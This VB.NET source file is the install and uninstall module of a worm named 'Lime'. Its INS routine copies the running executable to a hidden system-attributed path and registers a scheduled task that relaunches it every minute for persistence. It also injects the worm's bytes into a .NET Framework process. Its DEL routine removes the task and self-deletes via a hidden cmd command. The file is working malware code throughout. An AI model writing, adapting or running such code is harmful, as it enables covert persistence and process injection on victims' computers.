Public Class C_Installation

    Public Shared Sub INS()

        'Install worm on PC
        'Using schtasks instead of reg and startup folder

        If C_Settings.DROP Then
            If Application.ExecutablePath <> C_Settings.fullpath AndAlso IO.Path.GetFileName(Application.ExecutablePath) <> C_Settings.INJ_Name Then 'Checking if worm is already installed

                'Worm not installed// begin installing
                Try
                    If Not IO.Directory.Exists(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2) Then 'Checking and creating FOLDER PATH1 PATH2
                        IO.Directory.CreateDirectory(Environ(C_Settings.PATH1) & "\" & C_Settings.PATH2)
                    ElseIf IO.File.Exists(C_Settings.fullpath) Then 'If somehow filename exists , I will delete it and replace it with worm
                        IO.File.Delete(C_Settings.fullpath)
                    End If

                    Dim NF As New IO.FileStream(C_Settings.fullpath, IO.FileMode.CreateNew) 'Installing worm using FS instead of io.file.copy
                    Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Application.ExecutablePath)
                    NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                    NF.Flush()
                    NF.Close()

                    IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden) 'Hide worm

                    Shell("schtasks /create /f /sc minute /mo 1 /tn Lime_0.5 /tr " & C_Settings.fullpath & "", AppWinStyle.Hide, False, -1) 'persistence

                    Process.Start(C_Settings.fullpath) 'Start worm from fullpath location
                    End ' Close this application because fullpath will be started
                Catch ex As Exception
                End Try

            ElseIf Application.ExecutablePath = C_Settings.fullpath AndAlso C_Settings.INJ_CHK = True AndAlso IO.Path.GetFileName(Application.ExecutablePath.ToLower) <> C_Settings.INJ_Name.ToLower Then
                Try
                    S_Inject.injRun("\Windows\Microsoft.NET\Framework\v2.0.50727\" & C_Settings.INJ_Name, String.Empty, IO.File.ReadAllBytes(Application.ExecutablePath), True)
                    End
                Catch ex As Exception
                End Try
            End If
        Else
            C_Settings.fullpath = Application.ExecutablePath 'drop false
        End If


    End Sub

    Public Shared Sub DEL()
        'Uninstall worm from PC

        Try
            If C_Settings.DROP Then
                IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.Normal) 'un-hide
                Threading.Thread.Sleep(50)

                Shell("schtasks /Delete /tn Lime_0.5 /F", AppWinStyle.Hide, False, -1) 'delete persistence
                Threading.Thread.Sleep(50)
            End If
            Shell("cmd.exe /c ping 0 -n 2 & del """ & C_Settings.fullpath & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
            End
        Catch ex As Exception
        End Try
    End Sub

End Class